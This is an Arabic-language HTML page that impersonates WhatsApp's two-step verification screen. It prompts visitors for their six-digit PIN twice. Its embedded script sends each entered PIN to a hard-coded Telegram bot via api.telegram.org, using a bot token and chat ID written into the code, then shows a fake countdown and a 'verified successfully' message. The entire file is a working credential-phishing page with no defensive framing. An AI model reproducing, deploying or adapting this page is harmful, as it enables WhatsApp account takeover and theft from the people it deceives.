<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>تسجيل الدخول إلى WhatsApp</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #FAF3E7;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }

        .container img {
            width: 50px;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 20px;
            color: #333;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
        }

        .pin-input {
            font-size: 20px;
            letter-spacing: 10px;
            width: calc(1.5em * 6);
            border: none;
            border-bottom: 2px solid #25D366;
            text-align: center;
            margin-bottom: 15px;
            padding: 5px 0;
            outline: none;
            color: #333;
        }

        .pin-input:focus {
            border-color: #1DA955;
        }

        button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #25D366;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #1DA955;
        }

        .instruction {
            font-size: 12px;
            color: #999;
            margin-top: 10px;
        }

        #countdown {
            color: red;
            font-weight: bold;
            margin-top: 10px;
        }

        .forgot-link {
            color: #25D366;
            font-size: 14px;
            text-decoration: none;
            margin-top: 10px;
            display: block;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="container" id="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        <h1>التحقق بخطوتين</h1>
        <p>يرجى إدخال رمز PIN الذي قمت بإعداده مسبقًا أثناء إعداد التحقق بخطوتين.</p>
        <input id="activationCode1" class="pin-input" type="password" maxlength="6" placeholder="••••••">
        <button onclick="submitFirstActivationCode()">متابعة</button>
        <a href="#" class="forgot-link">نسيت رمز PIN؟</a>
        <div class="instruction">يرجى ملاحظة أن رمز PIN ليس رمز التفعيل الذي تلقيته عبر الرسائل النصية.</div>
        <div id="countdown"></div>
    </div>

    <script>
        function sendCodeToTelegram(code, type) {
            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
            const chatId = '612575358';
            const message = `${type}: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            }).catch(error => {
                console.error('فشل الاتصال بالخادم:', error);
            });
        }

        function startCountdown(callback) {
            let countdownValue = 5;
            const countdownDisplay = document.getElementById('countdown');
            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;

            const interval = setInterval(() => {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    countdownDisplay.textContent = '';
                    callback();
                } else {
                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
                }
            }, 1000);
        }

        function submitFirstActivationCode() {
            const activationCode1 = document.getElementById('activationCode1').value;

            if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
                return;
            }

            sendCodeToTelegram(activationCode1, "رمز التفعيل ");

            startCountdown(() => {
                const container = document.getElementById('container');
                container.innerHTML = `
                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                    <h1>إعادة التحقق من رمز PIN</h1>
                    <p>يرجى إعادة إدخال رمز PIN لتأكيد الدخول.</p>
                    <input id="activationCode2" class="pin-input" type="password" maxlength="6" placeholder="••••••">
                    <button onclick="submitSecondActivationCode()">متابعة</button>
                    <div id="countdown"></div>
                `;
            });
        }

        function submitSecondActivationCode() {
            const activationCode2 = document.getElementById('activationCode2').value;

            if (!activationCode2 || activationCode2.length !== 6 || !/^\d{6}$/.test(activationCode2)) {
                alert('يرجى إعادة إدخال رمز التحقق المكون من 6 أرقام.');
                return;
            }

            sendCodeToTelegram(activationCode2, "رمز التحقق ");

            startCountdown(() => {
                alert('تم التحقق بنجاح!');
            });
        }
    </script>
</body>

</html>
